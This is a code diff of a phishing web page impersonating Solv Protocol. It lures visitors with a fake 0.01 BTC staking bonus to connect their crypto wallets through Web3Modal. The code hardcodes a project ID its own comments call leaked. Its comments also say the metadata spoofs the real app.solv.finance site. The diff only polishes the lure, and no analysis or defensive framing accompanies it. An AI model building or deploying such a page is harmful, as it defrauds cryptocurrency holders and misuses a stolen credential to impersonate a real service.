@@ -1,33 +1,40 @@
 <!DOCTYPE html>
-<html>
-<head><title>Claim Your Solv Rewards</title></head>
+<html lang="en">
+<head>
+  <title>Solv Protocol - BTC Rewards</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
 <body>
-    <h1>Solv Protocol - BTC Rewards Portal</h1>
-    <p>Connect your wallet to claim your 0.01 BTC staking bonus.</p>
-    <button id="connect-button">Connect Wallet</button>
+  <h1>Solv Protocol - BTC Rewards Portal</h1>
+  <p>Connect your wallet to claim your 0.01 BTC staking bonus.</p>
+  
+  <div id="app">
+    <w3m-button></w3m-button>
+  </div>
 
-    <script type="module">
-        import { createWeb3Modal, defaultWagmiConfig } from 'https://unpkg.com/@web3modal/wagmi@3.5.0/dist/index.js'
-        import { mainnet } from 'https://unpkg.com/viem/chains'
+  <script type="module">
+    // Import the AppKit (Web3Modal) library directly
+    import { createWeb3Modal, defaultWagmiConfig } from 'https://unpkg.com/@web3modal/wagmi@3.5.0/dist/index.js'
+    import { mainnet } from 'https://unpkg.com/viem/chains'
 
-        // THE LEAKED KEY
-        const projectId = '_gg7wSSi0KMBsdKnGVfHDueq6xMB9EkC';
+    // THE LEAKED PROJECT ID
+    const projectId = '_gg7wSSi0KMBsdKnGVfHDueq6xMB9EkC'
 
-        const metadata = {
-            name: 'Solv Protocol',
-            description: 'Solv Finance App',
-            url: 'https://app.solv.finance', // Claiming to be the real site
-            icons: ['https://solv.finance/favicon.ico']
-        }
+    const metadata = {
+      name: 'Solv Protocol',
+      description: 'Solv Finance Rewards',
+      url: 'https://app.solv.finance', // We are spoofing this
+      icons: ['https://solv.finance/favicon.ico']
+    }
 
-        const chains = [mainnet]
-        const wagmiConfig = defaultWagmiConfig({ chains, projectId, metadata })
+    const chains = [mainnet]
+    const wagmiConfig = defaultWagmiConfig({ chains, projectId, metadata })
 
-        const modal = createWeb3Modal({ wagmiConfig, projectId, chains })
-
-        document.getElementById('connect-button').addEventListener('click', () => {
-            modal.open()
-        })
-    </script>
+    // Initialize the Modal
+    createWeb3Modal({ wagmiConfig, projectId, chains })
+    
+    console.log("Web3Modal initialized with Project ID: " + projectId);
+  </script>
 </body>
 </html>
